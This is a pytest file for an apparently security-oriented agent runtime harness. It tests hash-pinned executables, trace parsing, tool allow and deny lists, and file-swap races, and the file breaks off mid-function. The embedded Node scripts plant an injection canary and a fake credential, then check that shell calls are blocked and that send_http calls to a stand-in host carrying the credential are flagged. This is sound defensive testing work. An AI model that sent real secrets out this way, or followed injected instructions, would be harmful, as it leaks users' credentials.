from dataclasses import asdict, replace
import errno
import hashlib
import json
import os
from pathlib import Path
import re
import shlex
import shutil
import signal
import stat
import subprocess
import sys
import textwrap
import time

import pytest

from verity.agent_runtime import (
    AgentRuntimeConfig,
    AgentRuntimeCredentials,
    AgentRuntimeToolEvent,
    HarnessAgentRuntimeRunner,
)
from verity.intake import intake_directory
from verity.models import ArtifactFile
import verity.agent_runtime.runner as runtime_runner


PLUGIN_PATH = (
    Path(__file__).parents[1]
    / "src"
    / "verity"
    / "agent_runtime"
    / "verity_runtime_plugin.mjs"
)


def test_enabled_config_requires_pinned_executable_identity():
    with pytest.raises(ValueError, match="dsh_executable"):
        AgentRuntimeConfig(enabled=True)
    with pytest.raises(ValueError, match="dsh_sha256"):
        AgentRuntimeConfig(enabled=True, dsh_executable="/trusted/dsh")


@pytest.mark.parametrize("enabled", ["false", 1])
def test_config_requires_enabled_to_be_exact_bool_even_before_inert_return(enabled):
    with pytest.raises(ValueError) as error:
        AgentRuntimeConfig(enabled=enabled)
    assert str(error.value) == "enabled must be a boolean"


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("dsh_executable", "/trusted/dsh\nname"),
        ("dsh_executable", "/trusted/dsh\x00suffix"),
        ("dsh_executable", "/" + ("d" * 4096)),
        ("node_executable", "/trusted/node\rname"),
        ("node_executable", "/trusted/node\x00suffix"),
        ("node_executable", "/" + ("n" * 4096)),
    ],
)
def test_enabled_config_rejects_unbounded_or_controlled_executable_paths(
    field, value
):
    values = valid_config_values()
    values[field] = value
    with pytest.raises(ValueError, match=field):
        AgentRuntimeConfig(**values)


@pytest.mark.parametrize("configured_path", [None, object(), "/bad\x00path"])
def test_identity_validation_contains_malformed_paths(configured_path):
    path, digest, failure = HarnessAgentRuntimeRunner._validate_file_identity(
        configured_path,
        "0" * 64,
        identity_name="dsh",
        require_executable=False,
    )
    assert path == ""
    assert digest == ""
    assert failure == "dsh_executable_not_found"


def test_enabled_config_rejects_non_frozen_dsh_version():
    with pytest.raises(ValueError, match="expected_version"):
        AgentRuntimeConfig(
            enabled=True,
            dsh_executable="/trusted/dsh",
            dsh_sha256="0" * 64,
            expected_version="0.1.1-rc.1",
        )


def test_enabled_config_requires_pinned_node_identity():
    with pytest.raises(ValueError, match="node_executable"):
        AgentRuntimeConfig(
            enabled=True,
            dsh_executable="/trusted/dsh",
            dsh_sha256="0" * 64,
            base_url="https://model.example.invalid/v1",
            model_id="fixture-model",
        )


def valid_config_values():
    return {
        "enabled": True,
        "dsh_executable": "/trusted/dsh",
        "dsh_sha256": "A" * 64,
        "node_executable": "/trusted/node",
        "node_sha256": "b" * 64,
        "base_url": "https://model.example.invalid/v1",
        "model_id": "fixture-model",
    }


@pytest.mark.parametrize(
    ("overrides", "message"),
    [
        ({"dsh_executable": 42}, "dsh_executable"),
        ({"dsh_executable": "relative/dsh"}, "dsh_executable"),
        ({"dsh_sha256": None}, "dsh_sha256"),
        ({"dsh_sha256": "g" * 64}, "dsh_sha256"),
        ({"node_executable": 42}, "node_executable"),
        ({"node_executable": "relative/node"}, "node_executable"),
        ({"node_sha256": None}, "node_sha256"),
        ({"node_sha256": "0" * 63}, "node_sha256"),
        ({"base_url": ""}, "base_url"),
        ({"base_url": "http://model.example.invalid/v1"}, "base_url"),
        ({"base_url": "https://user@model.example.invalid/v1"}, "base_url"),
        ({"base_url": "https://model.example.invalid/v1?x=1"}, "base_url"),
        ({"base_url": "https://model.example.invalid/v1#fragment"}, "base_url"),
        ({"model_id": ""}, "model_id"),
        ({"model_id": "bad\nmodel"}, "model_id"),
        ({"model_id": "m" * 257}, "model_id"),
        ({"credentials": object()}, "credentials"),
        (
            {"credentials": AgentRuntimeCredentials(api_key_env="BAD-NAME")},
            "api_key_env",
        ),
        ({"scenario_ids": ()}, "scenario_ids"),
        (
            {"scenario_ids": ("agent_primary_task", "agent_primary_task")},
            "scenario_ids",
        ),
        ({"scenario_ids": ("unknown",)}, "scenario_ids"),
        ({"scenario_ids": ["agent_primary_task"]}, "scenario_ids"),
        ({"timeout_seconds": 0}, "timeout_seconds"),
        ({"timeout_seconds": float("inf")}, "timeout_seconds"),
        ({"timeout_seconds": True}, "timeout_seconds"),
        ({"max_stdout_bytes": 0}, "max_stdout_bytes"),
        ({"max_stdout_bytes": True}, "max_stdout_bytes"),
        ({"max_stdout_bytes": 16 * 1024 * 1024 + 1}, "max_stdout_bytes"),
        ({"max_stderr_bytes": 0}, "max_stderr_bytes"),
        ({"max_stderr_bytes": True}, "max_stderr_bytes"),
        ({"max_trace_events": 0}, "max_trace_events"),
        ({"max_trace_events": True}, "max_trace_events"),
        ({"max_trace_events": 4097}, "max_trace_events"),
    ],
)
def test_enabled_config_strictly_validates_trusted_inputs(overrides, message):
    values = valid_config_values()
    values.update(overrides)
    with pytest.raises(ValueError, match=message):
        AgentRuntimeConfig(**values)


@pytest.mark.parametrize(
    "base_url",
    [
        "https://model.example.invalid/v1",
        "http://localhost:8000/v1",
        "http://127.0.0.1:8000/v1",
        "http://[::1]:8000/v1",
    ],
)
def test_enabled_config_accepts_https_or_loopback_http(base_url):
    values = valid_config_values()
    values["base_url"] = base_url
    assert AgentRuntimeConfig(**values).base_url == base_url


def test_observation_rejects_raw_tool_arguments():
    event = AgentRuntimeToolEvent(
        tool_name="read_file",
        target_class="synthetic_sensitive",
        outcome="blocked",
        canary_present=False,
    )
    assert "arguments" not in asdict(event)


def test_plugin_separates_injection_fixture_from_credential_exfiltration_signal(
    tmp_path,
):
    trace_path = tmp_path / "trace.jsonl"
    script = textwrap.dedent(
        f"""
        import {{ readFileSync, existsSync }} from 'node:fs'
        import {{ apply }} from {json.dumps(PLUGIN_PATH.as_uri())}

        let guard
        let preExecute
        let toolResult
        const registered = []
        const ctx = {{
          tools: {{
            register(definition) {{ registered.push(definition) }},
            guard(callback) {{ guard = callback }},
          }},
          on(name, callback) {{
            if (name === 'tools/pre-execute') preExecute = callback
            if (name === 'tools/result') toolResult = callback
          }},
        }}
        apply(ctx, {{
          tracePath: {json.dumps(str(trace_path))},
          injectionCanary: 'INJECTION_ONLY_CANARY',
          credentialCanary: 'FAKE_CREDENTIAL_CANARY',
          maxTraceEvents: 3,
          skillName: 'fixture-skill',
        }})

        const readFile = registered.find((item) => item.name === 'read_file')
        const external = await readFile.execute({{ path: 'external/document.txt' }})
        const secret = await readFile.execute({{ path: 'secrets/api-key.txt' }})
        if (!external.content.includes('INJECTION_ONLY_CANARY') || external.content.includes('FAKE_CREDENTIAL_CANARY')) {{
          throw new Error(`wrong external fixture boundary: ${{JSON.stringify(external)}}`)
        }}
        if (secret.content !== 'FAKE_CREDENTIAL_CANARY' || secret.content.includes('INJECTION_ONLY_CANARY')) {{
          throw new Error(`wrong synthetic credential fixture: ${{JSON.stringify(secret)}}`)
        }}

        if (guard({{ name: 'skill', arguments: {{ name: 'fixture-skill' }} }}) !== undefined) {{
          throw new Error('expected matching skill loader allowance')
        }}
        if (guard({{ name: 'skill', arguments: {{ name: 'wrong-skill' }} }}) !== 'verity_runtime_tool_not_allowed') {{
          throw new Error('wrong skill loader was allowed')
        }}
        for (const name of ['read_file', 'send_http', 'run_shell', 'request_approval']) {{
          if (guard({{ name }}) !== undefined) throw new Error(`unexpected denial: ${{name}}`)
        }}
        for (const name of ['bash', 'web_search', 'subagent', 'write_file']) {{
          if (guard({{ name }}) !== 'verity_runtime_tool_not_allowed') {{
            throw new Error(`unexpected allowance: ${{name}}`)
          }}
        }}

        await preExecute(
          {{ name: 'skill', arguments: {{ name: 'fixture-skill', raw: 'RAW_LOADER_ARG' }} }},
          async () => ({{ kind: 'allow' }}),
        )
        if (existsSync({json.dumps(str(trace_path))})) {{
          throw new Error('skill loader call must be excluded from action trace')
        }}
        await toolResult(
          {{ name: 'skill', arguments: {{ name: 'fixture-skill', raw: 'RAW_LOADER_ARG' }} }},
          {{ isError: false, content: 'RAW_LOADER_RESULT' }},
        )
        await preExecute(
          {{ name: 'run_shell', arguments: {{ command: 'RAW_SHELL_ARG INJECTION_ONLY_CANARY' }} }},
          async () => ({{ kind: 'allow' }}),
        )
        await preExecute(
          {{ name: 'send_http', arguments: {{ url: 'https://invalid.test/INJECTION_ONLY_CANARY' }} }},
          async () => ({{ kind: 'allow' }}),
        )
        await preExecute(
          {{ name: 'send_http', arguments: {{ url: 'https://invalid.test/FAKE_CREDENTIAL_CANARY' }} }},
          async () => ({{ kind: 'allow' }}),
        )
        const trace = readFileSync({json.dumps(str(trace_path))}, 'utf8')
        if (trace.includes('RAW_SHELL_ARG') || trace.includes('RAW_LOADER_ARG') || trace.includes('RAW_LOADER_RESULT') || trace.includes('INJECTION_ONLY_CANARY') || trace.includes('FAKE_CREDENTIAL_CANARY')) {{
          throw new Error('raw arguments reached trace')
        }}
        const lines = trace.trimEnd().split('\\n').map(JSON.parse)
        if (lines.length !== 4 || lines[0].skill_loaded !== true) {{
          throw new Error(`missing successful loader marker: ${{trace}}`)
        }}
        const [shellInjection, httpInjection, httpCredential] = lines.slice(1)
        if (shellInjection.tool_name !== 'run_shell' || shellInjection.outcome !== 'blocked' || shellInjection.canary_present) {{
          throw new Error(`injection-only shell was misclassified: ${{trace}}`)
        }}
        if (httpInjection.tool_name !== 'send_http' || httpInjection.canary_present) {{
          throw new Error(`injection-only HTTP was misclassified: ${{trace}}`)
        }}
        if (httpCredential.tool_name !== 'send_http' || !httpCredential.canary_present) {{
          throw new Error(`unexpected trace: ${{trace}}`)
        }}
        console.log(JSON.stringify(registered.map((item) => item.name).sort()))
        """
    )
    completed = subprocess.run(
        ["node", "--input-type=module", "-e", script],
        capture_output=True,
        text=True,
        check=False,
        timeout=10,
    )
    assert completed.returncode == 0, completed.stderr
    assert json.loads(completed.stdout) == [
        "read_file",
        "request_approval",
        "run_shell",
        "send_http",
    ]


def test_plugin_emits_controlled_trace_overflow_sentinel(tmp_path):
    trace_path = tmp_path / "trace.jsonl"
    script = textwrap.dedent(
        f"""
        import {{ readFileSync }} from 'node:fs'
        import {{ apply }} from {json.dumps(PLUGIN_PATH.as_uri())}

        let preExecute
        let toolResult
        const ctx = {{
          tools: {{ register() {{}}, guard() {{}} }},
          on(name, callback) {{
            if (name === 'tools/pre-execute') preExecute = callback
            if (name === 'tools/result') toolResult = callback
          }},
        }}
        apply(ctx, {{
          tracePath: {json.dumps(str(trace_path))},
          injectionCanary: 'INJECTION_ONLY_CANARY',
          credentialCanary: 'FAKE_CREDENTIAL_CANARY',
          maxTraceEvents: 2,
          skillName: 'fixture-skill',
        }})
        await toolResult(
          {{ name: 'skill', arguments: {{ name: 'fixture-skill' }} }},
          {{ isError: false }},
        )
        for (let index = 0; index < 3; index += 1) {{
          await preExecute(
            {{ name: 'run_shell', arguments: {{ command: `raw-${{index}}` }} }},
            async () => ({{ kind: 'allow' }}),
          )
        }}
        const lines = readFileSync({json.dumps(str(trace_path))}, 'utf8')
          .trimEnd().split('\\n').map(JSON.parse)
        if (lines.length !== 4 || lines[0].skill_loaded !== true || lines[3].trace_overflow !== true) {{
          throw new Error(`missing controlled overflow sentinel: ${{JSON.stringify(lines)}}`)
        }}
        if (JSON.stringify(lines).includes('raw-')) throw new Error('raw args leaked')
        """
    )
    completed = subprocess.run(
        ["node", "--input-type=module", "-e", script],
        capture_output=True,
        text=True,
        check=False,
        timeout=10,
    )
    assert completed.returncode == 0, completed.stderr


def test_plugin_bounds_repeated_skill_loader_markers(tmp_path):
    trace_path = tmp_path / "trace.jsonl"
    script = textwrap.dedent(
        f"""
        import {{ apply }} from {json.dumps(PLUGIN_PATH.as_uri())}

        let toolResult
        const ctx = {{
          tools: {{ register() {{}}, guard() {{}} }},
          on(name, callback) {{
            if (name === 'tools/result') toolResult = callback
          }},
        }}
        apply(ctx, {{
          tracePath: {json.dumps(str(trace_path))},
          injectionCanary: 'INJECTION_ONLY_CANARY',
          credentialCanary: 'FAKE_CREDENTIAL_CANARY',
          maxTraceEvents: 1,
          skillName: 'fixture-skill',
        }})
        for (let index = 0; index < 10_000; index += 1) {{
          await toolResult(
            {{ name: 'skill', arguments: {{ name: 'fixture-skill' }} }},
            {{ isError: false }},
          )
        }}
        """
    )
    completed = subprocess.run(
        ["node", "--input-type=module", "-e", script],
        capture_output=True,
        text=True,
        check=False,
        timeout=10,
    )
    assert completed.returncode == 0, completed.stderr
    assert trace_path.read_bytes().count(b"\n") == 2
    events, truncated, failure = HarnessAgentRuntimeRunner._read_trace(trace_path, 1)
    assert events == ()
    assert truncated is False
    assert failure == "agent_runtime_skill_load_invalid"


@pytest.mark.parametrize(
    "line",
    [
        b'{"tool_name":"read_file","tool_name":"send_http","target_class":"project_public","outcome":"completed","canary_present":false}\n',
        b'{"tool_name":"read_file","target_class":"project_public","outcome":"completed","canary_present":false,"extra":1}\n',
    ],
)
def test_trace_rejects_duplicate_or_extra_json_keys(tmp_path, line):
    trace_path = tmp_path / "trace.jsonl"
    trace_path.write_bytes(line)
    events, truncated, failure = HarnessAgentRuntimeRunner._read_trace(trace_path, 2)
    assert events == ()
    assert truncated is False
    assert failure == "agent_runtime_trace_invalid"


def test_trace_rejects_whole_file_over_bound_before_silent_drop(tmp_path):
    trace_path = tmp_path / "trace.jsonl"
    valid = (
        b'{"tool_name":"read_file","target_class":"project_public",'
        b'"outcome":"completed","canary_present":false}\n'
    )
    trace_path.write_bytes(valid * 300)
    events, truncated, failure = HarnessAgentRuntimeRunner._read_trace(trace_path, 1)
    assert events == ()
    assert truncated is False
    assert failure == "agent_runtime_trace_invalid"


def test_trace_overflow_sentinel_is_failed_not_completed(tmp_path):
    trace_path = tmp_path / "trace.jsonl"
    trace_path.write_bytes(
        b'{"skill_loaded":true}\n{"trace_overflow":true}\n'
    )
    events, truncated, failure = HarnessAgentRuntimeRunner._read_trace(trace_path, 1)
    assert events == ()
    assert truncated is True
    assert failure == "agent_runtime_trace_overflow"


def test_trace_requires_one_successful_skill_marker_before_actions(tmp_path):
    trace_path = tmp_path / "trace.jsonl"
    action = (
        b'{"tool_name":"read_file","target_class":"project_public",'
        b'"outcome":"completed","canary_present":false}\n'
    )
    trace_path.write_bytes(b'{"skill_loaded":true}\n' + action)
    events, truncated, failure = HarnessAgentRuntimeRunner._read_trace(trace_path, 1)
    assert len(events) == 1
    assert truncated is False
    assert failure is None


@pytest.mark.parametrize(
    ("payload", "reason"),
    [
        (None, "agent_runtime_skill_load_missing"),
        (
            b'{"tool_name":"read_file","target_class":"project_public",'
            b'"outcome":"completed","canary_present":false}\n',
            "agent_runtime_skill_load_missing",
        ),
        (b'{"skill_loaded":false}\n', "agent_runtime_skill_load_failed"),
        (
            b'{"skill_loaded":true}\n{"skill_loaded":true}\n',
            "agent_runtime_skill_load_invalid",
        ),
        (
            b'{"tool_name":"read_file","target_class":"project_public",'
            b'"outcome":"completed","canary_present":false}\n'
            b'{"skill_loaded":true}\n',
            "agent_runtime_skill_load_missing",
        ),
    ],
)
def test_trace_fails_closed_without_exact_successful_skill_load(
    tmp_path, payload, reason
):
    trace_path = tmp_path / "trace.jsonl"
    if payload is not None:
        trace_path.write_bytes(payload)
    events, truncated, failure = HarnessAgentRuntimeRunner._read_trace(trace_path, 2)
    assert events == ()
    assert truncated is False
    assert failure == reason


class _FakeDsh:
    def __init__(
        self,
        root: Path,
        *,
        hangs: bool = False,
        version_hangs: bool = False,
        version_output_bytes: int = 0,
        scenario_output_bytes: int = 0,
        descendant_pid_path: Path = None,
        overflow_descendant_pid_path: Path = None,
        normal_exit_descendant_pid_path: Path = None,
        version_descendant_pid_path: Path = None,
        load_trace_mode: str = "success",
        mutate_on_version: bool = False,
        credential_source_name: str = "",
        credential_expected: str = "",
    ):
        self.path = root / "dsh"
        self.node_path = root / "node"
        self.node_path.write_text(
            f"#!/bin/sh\nexec {shlex.quote(sys.executable)} \"$@\"\n",
            encoding="utf-8",
        )
        self.node_path.chmod(self.node_path.stat().st_mode | stat.S_IXUSR)
        self.node_sha256 = hashlib.sha256(self.node_path.read_bytes()).hexdigest()
        credential_guard = ""
        if credential_source_name:
            credential_guard = textwrap.dedent(
                f"""
                if {credential_source_name!r} in os.environ:
                    raise SystemExit(31)
                if os.environ.get('VERITY_AGENT_RUNTIME_API_KEY') != {credential_expected!r}:
                    raise SystemExit(32)
                """
            ).strip()
        scenario_body = (
            "print('secret model output', flush=True)\n"
            "time.sleep(30)"
            if hangs
            else textwrap.dedent(
                """
                trace_path = pathlib.Path(os.environ['VERITY_AGENT_RUNTIME_TRACE'])
                trace_path.write_text(
                    json.dumps({'skill_loaded': True}) + '\\n' +
                    json.dumps({
                        'tool_name': 'read_file',
                        'target_class': 'project_public',
                        'outcome': 'completed',
                        'canary_present': False,
                    }) + '\\n',
                    encoding='utf-8',
                )
                print(json.dumps({'response': 'secret model output'}))
                """
            ).strip()
        )
        if scenario_output_bytes:
            scenario_body = (
                f"os.write(1, b'X' * {scenario_output_bytes})\n"
                "time.sleep(30)"
            )
        if descendant_pid_path is not None:
            scenario_body = textwrap.dedent(
                f"""
                descendant = subprocess.Popen([
                    sys.executable,
                    '-c',
                    'import time; time.sleep(30)',
                ])
                pathlib.Path({str(descendant_pid_path)!r}).write_text(
                    str(descendant.pid), encoding='ascii'
                )
                print('spawned descendant', flush=True)
                time.sleep(30)
                """
            ).strip()
        if overflow_descendant_pid_path is not None:
            scenario_body = textwrap.dedent(
                f"""
                descendant = subprocess.Popen([
                    sys.executable,
                    '-c',
                    'import os, time; os.write(1, b"X" * 4096); time.sleep(30)',
                ])
                pathlib.Path({str(overflow_descendant_pid_path)!r}).write_text(
                    str(descendant.pid), encoding='ascii'
                )
                raise SystemExit(0)
                """
            ).strip()
        if normal_exit_descendant_pid_path is not None:
            scenario_body = textwrap.dedent(
                f"""
                descendant = subprocess.Popen(
                    [sys.executable, '-c', 'import time; time.sleep(30)'],
                    stdin=subprocess.DEVNULL,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                pathlib.Path({str(normal_exit_descendant_pid_path)!r}).write_text(
                    str(descendant.pid), encoding='ascii'
                )
                trace_path = pathlib.Path(os.environ['VERITY_AGENT_RUNTIME_TRACE'])
                trace_path.write_text(
                    json.dumps({{'skill_loaded': True}}) + '\\n' +
                    json.dumps({{
                        'tool_name': 'read_file',
                        'target_class': 'project_public',
                        'outcome': 'completed',
                        'canary_present': False,
                    }}) + '\\n',
                    encoding='utf-8',
                )
                print(json.dumps({{'response': 'bounded response'}}))
                raise SystemExit(0)
                """
            ).strip()
        if load_trace_mode != "success":
            event_json = (
                "json.dumps({'tool_name': 'read_file', "
                "'target_class': 'project_public', 'outcome': 'completed', "
                "'canary_present': False})"
            )
            trace_expression = {
                "missing": None,
                "failed": "json.dumps({'skill_loaded': False}) + '\\n'",
                "duplicate": (
                    "json.dumps({'skill_loaded': True}) + '\\n' + "
                    "json.dumps({'skill_loaded': True}) + '\\n'"
                ),
                "action_before": (
                    event_json + " + '\\n' + "
                    "json.dumps({'skill_loaded': True}) + '\\n'"
                ),
            }[load_trace_mode]
            write_trace = (
                ""
                if trace_expression is None
                else (
                    "trace_path = pathlib.Path(os.environ['VERITY_AGENT_RUNTIME_TRACE'])\n"
                    f"trace_path.write_text({trace_expression}, encoding='utf-8')\n"
                )
            )
            scenario_body = (
                write_trace + "print(json.dumps({'response': 'bounded response'}))"
            )
        if credential_guard:
            scenario_body = credential_guard + "\n" + scenario_body
        mutation = (
            f"pathlib.Path({str(self.path)!r}).write_text('# identity changed\\n', encoding='utf-8')"
            if mutate_on_version
            else ""
        )
        version_credential_guard = ""
        if credential_source_name:
            version_credential_guard = textwrap.dedent(
                f"""
                if {credential_source_name!r} in os.environ or 'VERITY_AGENT_RUNTIME_API_KEY' in os.environ:
                    raise SystemExit(30)
                """
            ).strip()
        version_action = "print('0.1.1-rc.2')"
        if version_hangs:
            version_action = "time.sleep(30)"
        elif version_output_bytes:
            version_action = (
                f"os.write(1, b'V' * {version_output_bytes})\n"
                "time.sleep(30)"
            )
        elif version_descendant_pid_path is not None:
            version_action = textwrap.dedent(
                f"""
                descendant = subprocess.Popen(
                    [sys.executable, '-c', 'import time; time.sleep(30)'],
                    stdin=subprocess.DEVNULL,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                pathlib.Path({str(version_descendant_pid_path)!r}).write_text(
                    str(descendant.pid), encoding='ascii'
                )
                print('0.1.1-rc.2')
                """
            ).strip()
        source = textwrap.dedent(
            f"""\
            #!/usr/bin/env python3
            import json
            import os
            import pathlib
            import subprocess
            import sys
            import time

            if sys.argv[1:] == ['--version']:
                {textwrap.indent(version_credential_guard, '                ').lstrip()}
                {textwrap.indent(version_action, '                ').lstrip()}
                {mutation}
                raise SystemExit(0)

            {textwrap.indent(scenario_body, '            ').lstrip()}
            """
        )
        self.path.write_text(source, encoding="utf-8")
        self.path.chmod(self.path.stat().st_mode | stat.S_IXUSR)
        self.sha256 = hashlib.sha256(self.path.read_bytes()).hexdigest()
        self.invocations = []
        self.version_invocations = []

    @property
    def scenario_invocations(self):
        return len(self.invocations)

    def popen(self, args, **kwargs):
        if "--version" in args:
            self.version_invocations.append(
                {
                    "args": tuple(args),
                    "env": dict(kwargs["env"]),
                    "shell": kwargs.get("shell"),
                }
            )
            return subprocess.Popen(args, **kwargs)
        patch_path = Path(args[args.index("--patch") + 1])
        self.invocations.append(
            {
                "args": tuple(args),
                "shell": kwargs.get("shell"),
                "env": dict(kwargs["env"]),
                "dsh_home": kwargs["env"]["DSH_HOME"],
                "agents_home": kwargs["env"]["DSH_AGENTS_HOME"],
                "cwd": kwargs["cwd"],
                "cwd_entries": tuple(Path(kwargs["cwd"]).iterdir()),
                "patch": patch_path.read_text(encoding="utf-8"),
                "patch_path": str(patch_path),
            }
        )
        return subprocess.Popen(args, **kwargs)


@pytest.fixture
def fake_dsh(tmp_path):
    return _FakeDsh(tmp_path)


@pytest.fixture
def hanging_dsh(tmp_path):
    return _FakeDsh(tmp_path, hangs=True)


@pytest.fixture
def skill_snapshot(tmp_path):
    root = tmp_path / "fixture-skill"
    root.mkdir()
    (root / "SKILL.md").write_text(
        "---\nname: fixture-skill\n"
        "description: Provides a deterministic synthetic tool workflow for Verity "
        "agent-runtime tests. Use when validating the dsh harness, isolated Skill "
        "loading, read_file calls, and runtime security controls.\n---\n"
        "Use the synthetic tools to inspect project/README.md.\n",
        encoding="utf-8",
    )
    snapshot, file_bytes = intake_directory(root)
    return type("SkillSnapshot", (), {"snapshot": snapshot, "file_bytes": file_bytes})()


def enabled_config(fake_dsh, **overrides):
    values = {
        "enabled": True,
        "dsh_executable": str(fake_dsh.path),
        "dsh_sha256": fake_dsh.sha256,
        "node_executable": str(fake_dsh.node_path),
        "node_sha256": fake_dsh.node_sha256,
        "base_url": "https://model.example.invalid/v1",
        "model_id": "fixture-model",
    }
    values.update(overrides)
    return AgentRuntimeConfig(**values)


def test_skill_fixture_matches_agent_skills_name_and_description_contract(
    skill_snapshot,
):
    skill_file = next(
        item
        for item in skill_snapshot.snapshot.files
        if item.normalizedPath == "SKILL.md"
    )
    source = skill_snapshot.file_bytes[skill_file.fileId].decode("utf-8")
    assert "\nname: fixture-skill\n" in source
    description = next(
        line.removeprefix("description: ")
        for line in source.splitlines()
        if line.startswith("description: ")
    )
    assert "deterministic synthetic tool workflow" in description
    assert "Use when" in description
    for keyword in ("dsh", "agent-runtime", "read_file", "test"):
        assert keyword in description


def run_with_fake_dsh(fake_dsh, skill_snapshot, **overrides):
    return HarnessAgentRuntimeRunner(popen_factory=fake_dsh.popen).run(
        config=enabled_config(fake_dsh, **overrides),
        snapshot=skill_snapshot.snapshot,
        file_bytes=skill_snapshot.file_bytes,
        skill_name="fixture-skill",
    )


@pytest.mark.parametrize(
    ("load_trace_mode", "reason"),
    [
        ("missing", "agent_runtime_skill_load_missing"),
        ("failed", "agent_runtime_skill_load_failed"),
        ("duplicate", "agent_runtime_skill_load_invalid"),
        ("action_before", "agent_runtime_skill_load_missing"),
    ],
)
def test_runner_cannot_complete_without_exact_successful_skill_load(
    tmp_path, skill_snapshot, load_trace_mode, reason
):
    tool_root = tmp_path / f"loader-{load_trace_mode}"
    tool_root.mkdir()
    fake = _FakeDsh(tool_root, load_trace_mode=load_trace_mode)
    result = run_with_fake_dsh(
        fake,
        skill_snapshot,
        scenario_ids=("agent_primary_task",),
    )
    assert result.status == "failed"
    assert result.reasonCode == reason


def test_runner_fails_closed_on_version_or_hash_mismatch(fake_dsh, skill_snapshot):
    config = enabled_config(fake_dsh, dsh_sha256="0" * 64)
    result = HarnessAgentRuntimeRunner(popen_factory=fake_dsh.popen).run(
        config=config,
        snapshot=skill_snapshot.snapshot,
        file_bytes=skill_snapshot.file_bytes,
        skill_name="fixture-skill",
    )
    assert result.status == "failed"
    assert result.reasonCode == "dsh_sha256_mismatch"
    assert fake_dsh.scenario_invocations == 0


def test_runner_fails_closed_on_node_hash_mismatch(fake_dsh, skill_snapshot):
    config = enabled_config(fake_dsh, node_sha256="0" * 64)
    result = HarnessAgentRuntimeRunner(popen_factory=fake_dsh.popen).run(
        config=config,
        snapshot=skill_snapshot.snapshot,
        file_bytes=skill_snapshot.file_bytes,
        skill_name="fixture-skill",
    )
    assert result.status == "failed"
    assert result.reasonCode == "node_sha256_mismatch"
    assert fake_dsh.scenario_invocations == 0


def test_node_executable_policy_is_bound_to_opened_source_inode(
    tmp_path, monkeypatch
):
    source_dir = tmp_path / "runtime"
    source_dir.mkdir()
    source = source_dir / "node"
    original = b"verified-but-not-executable"
    source.write_bytes(original)
    source.chmod(0o600)
    displaced = tmp_path / "opened-runtime"
    destination = tmp_path / "private-node"
    real_fstat = runtime_runner.os.fstat
    swapped = False

    def swap_path_after_source_open(descriptor):
        nonlocal swapped
        metadata = real_fstat(descriptor)
        if not swapped and stat.S_ISREG(metadata.st_mode):
            swapped = True
            source_dir.rename(displaced)
            source_dir.mkdir()
            source.write_bytes(b"replacement-path-is-executable")
            source.chmod(0o700)
        return metadata

    monkeypatch.setattr(runtime_runner.os, "fstat", swap_path_after_source_open)
    _, _, _, failure = HarnessAgentRuntimeRunner._snapshot_verified_file(
        str(source),
        hashlib.sha256(original).hexdigest(),
        destination=destination,
        identity_name="node",
        require_executable=True,
    )
    assert swapped is True
    assert failure == "node_executable_not_executable"
    assert not destination.exists()


@pytest.mark.skipif(os.name != "posix", reason="POSIX execute-mode semantics")
@pytest.mark.parametrize(
    (
        "effective_uid",
        "effective_gid",
        "groups",
        "source_uid",
        "source_gid",
        "mode",
        "expected",
    ),
    [
        (100, 200, [200], 100, 200, stat.S_IXUSR, True),
        (100, 200, [200], 100, 200, stat.S_IXGRP, False),
        (101, 200, [200], 100, 200, stat.S_IXGRP, True),
        (101, 200, [200], 100, 200, stat.S_IXOTH, False),
        (101, 201, [201], 100, 200, stat.S_IXOTH, True),
        (0, 0, [], 100, 200, stat.S_IXGRP, True),
        (0, 0, [], 100, 200, 0, False),
    ],
)
def test_opened_source_execute_policy_uses_effective_posix_mode_class(
    monkeypatch,
    effective_uid,
    effective_gid,
    groups,
    source_uid,
    source_gid,
    mode,
    expected,
):
    monkeypatch.setattr(runtime_runner.os, "geteuid", lambda: effective_uid)
    monkeypatch.setattr(runtime_runner.os, "getegid", lambda: effective_gid)
    monkeypatch.setattr(runtime_runner.os, "getgroups", lambda: groups)
    metadata = os.stat_result(
        (stat.S_IFREG | mode, 1, 1, 1, source_uid, source_gid, 0, 0, 0, 0)
    )
    assert (
        HarnessAgentRuntimeRunner._opened_source_is_executable(metadata)
        is expected
    )


def test_runner_keeps_using_verified_snapshot_after_source_changes_during_version_probe(
    tmp_path, skill_snapshot
):
    tool_root = tmp_path / "mutable-tool"
    tool_root.mkdir()
    mutable_dsh = _FakeDsh(tool_root, mutate_on_version=True)
    result = run_with_fake_dsh(
        mutable_dsh,
        skill_snapshot,
        scenario_ids=("agent_primary_task",),
    )
    assert result.status == "completed"
    assert result.reasonCode is None
    assert mutable_dsh.scenario_invocations == 1


def test_runner_executes_private_verified_dsh_snapshot_if_source_is_swapped_at_spawn(
    tmp_path, skill_snapshot
):
    tool_root = tmp_path / "dsh-swap-tool"
    tool_root.mkdir()
    fake = _FakeDsh(tool_root)
    config = enabled_config(
        fake,
        scenario_ids=("agent_primary_task",),
    )
    swapped = False

    def swap_then_spawn(args, **kwargs):
        nonlocal swapped
        if "--version" not in args and not swapped:
            swapped = True
            fake.path.write_text("raise SystemExit(43)\n", encoding="utf-8")
        return fake.popen(args, **kwargs)

    result = HarnessAgentRuntimeRunner(popen_factory=swap_then_spawn).run(
        config=config,
        snapshot=skill_snapshot.snapshot,
        file_bytes=skill_snapshot.file_bytes,
        skill_name="fixture-skill",
    )
    assert swapped is True
    assert result.status == "completed"
    assert fake.invocations[0]["args"][1] != str(fake.path)


def test_runner_executes_private_verified_node_snapshot_if_source_is_swapped_at_spawn(
    tmp_path, skill_snapshot
):
    tool_root = tmp_path / "node-swap-tool"
    tool_root.mkdir()
    fake = _FakeDsh(tool_root)
    node_source = tool_root / "node"
    python = shlex.quote(sys.executable)
    node_source.write_text(
        f"#!/bin/sh\nexec {python} \"$@\"\n",
        encoding="utf-8",
    )
    node_source.chmod(node_source.stat().st_mode | stat.S_IXUSR)
    fake.node_path = node_source
    fake.node_sha256 = hashlib.sha256(node_source.read_bytes()).hexdigest()
    config = enabled_config(
        fake,
        scenario_ids=("agent_primary_task",),
    )
    execution_marker = tmp_path / "swapped-node-executed"
    swapped = False

    def swap_then_spawn(args, **kwargs):
        nonlocal swapped
        if not swapped:
            swapped = True
            node_source.write_text(
                "#!/bin/sh\n"
                f"printf executed > {shlex.quote(str(execution_marker))}\n"
                f"exec {python} \"$@\"\n",
                encoding="utf-8",
